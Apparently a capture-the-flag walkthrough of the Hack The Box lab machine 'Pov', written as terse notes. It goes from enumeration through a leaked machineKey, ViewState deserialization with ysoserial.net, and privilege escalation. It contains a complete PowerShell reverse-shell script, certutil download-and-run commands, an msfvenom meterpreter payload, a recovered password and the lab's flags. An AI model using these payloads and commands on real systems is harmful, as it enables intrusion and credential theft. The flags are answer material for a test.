**Recon & Enumeration**

**Port Scan**

rustscan -r 1-65535 -a 10.10.11.251 -- -sV -Pn -A

![[Pov image.png]]

![[Pov image 1.png]]

80

echo "10.10.11.251 pov.htb" | sudo tee -a /etc/hosts

**Directory Enumeration**

gobuster dir -u http://10.10.11.251 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -s "200,301" -e -t 50 --status-codes ""

![[Pov image 2.png]]

Nothing

![[Pov image 3.png]]

**Vhost Enumeration**

gobuster vhost -u http://pov.htb/ -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt --append-domain -r

![[Pov image 4.png]]

echo "10.10.11.251 dev.pov.htb" | sudo tee -a /etc/hosts

![[Pov image 5.png]]

![[Pov image 6.png]]

I found The Download Link

Launch the Burp Suite

![[Pov image 7.png]]

__EVENTTARGET=download&__EVENTARGUMENT=&__VIEWSTATE=vlK0NUuzRpLEA4kmZKkDSwRb5MMFia5uJAa9F0ewFV%2BL9fAnlePLm2mYoUpG5DwZGG6%2BtdFgduY8MrK8xqEBeXA14nQ%3D&__VIEWSTATEGENERATOR=8E0F0FA3&__EVENTVALIDATION=kG0Xtq%2FKfI63PNqL15EZxV%2B6asLAMWlwCiAu3bHFRKMgBYsc3RDOjj%2FYvW4cNBr0EaqNpr99x1lnYjNtJmdA12Y7EZ2bYo6eAihWfh1VTXB%2BP0PviRZCNwi5%2FYz6bqBuXu9kbw%3D%3D&file=cv.pdf

Test LFI

![[Pov image 8.png]]

![[Pov image 9.png]]

\<configuration>

\<system.web>

\<customErrors mode="On" defaultRedirect="default.aspx" />

\<httpRuntime targetFramework="4.5" />

\<machineKey decryption="AES" decryptionKey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" validation="SHA1" validationKey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" />

\</system.web>

\<system.webServer>

\<httpErrors>

\<remove statusCode="403" subStatusCode="-1" />

\<error statusCode="403" prefixLanguageFilePath="" path="http://dev.pov.htb:8080/portfolio" responseMode="Redirect" />

\</httpErrors>

\<httpRedirect enabled="true" destination="http://dev.pov.htb/portfolio" exactDestination="false" childOnly="true" />

\</system.webServer>

\</configuration>

**Focus on View State**

Hack Tricks

https://book.hacktricks.xyz/pentesting-web/deserialization/exploiting-__viewstate-parameter

![[Pov image 10.png]]

Launch The Windows VM

github

https://github.com/NHPT/ysoserial.net

![[Pov image 11.png]]

Create a powershell script of reverse shell

$client = New-Object System.Net.Sockets.TCPClient('10.10.14.120',80);$stream = $client.GetStream();\[byte\[\]\]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = (\[text.encoding\]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

![[Pov image 12.png]]

Failed

Since it failed, access it from the following URL and create it on the web.

https://www.revshells.com/

![[Pov image 13.png]]

./ysoserial.exe -p ViewState -g TextFormattingRunProperties --decryptionalg="AES" --decryptionkey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" --validationalg="SHA1" --validationkey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" --path="/portfolio/default.aspx" -c "powershell -e  payload"

Create payload

![[Pov image 14.png]]

![[Pov image 15.png]]

Send the created payload as the value of the ViewState from Burp Suite.

Listen

rlwrap nc -nlvp 4444

![[Pov image 16.png]]

![[Pov image 17.png]]

![[Pov image 18.png]]

whoami /priv

![[Pov image 19.png]]

![[Pov image 20.png]]

Password Crack

PS C:\> $cred = Import-CliXml C:\Users\sfitz\Documents\connection.xml

PS C:\>  $cred.GetNetworkCredential() | fl

![[Pov image 21.png]]

UserName       : alaading

Password       : f8gQ8fynP44ek1m3

**Download Runascs.cs**

certutil.exe -urlcache -f http://10.10.14.120/RunasCs.cs RunasCs.cs

![[Pov image 22.png]]

**Compile**

C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe -target:exe -optimize -out:RunasCs.exe RunasCs.cs

![[Pov image 23.png]]

.\RunasCs.exe alaading f8gQ8fynP44ek1m3 cmd.exe -r 10.10.14.120:5555

![[Pov image 24.png]]

**User Frag**

alaading session

![[Pov image 25.png]]

![[Pov image 26.png]]

d176a2cd69996634fafdf8bb441cbffa

**Privilege Escalation**

**Create Payload**

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=6666 -f exe -o payload.exe

![[Pov image 27.png]]

certutil.exe -urlcache -split -f http://10.10.14.120/payload.exe payload.exe

![[Pov image 28.png]]

![[Pov image 29.png]]

![[Pov image 30.png]]

![[Pov image 31.png]]

get-process winlogon

![[Pov image 32.png]]

556

migrate 556

![[Pov image 33.png]]

**root.txt**

![[Pov image 34.png]]

3253df0a4a39b3358e3f2d416f177d14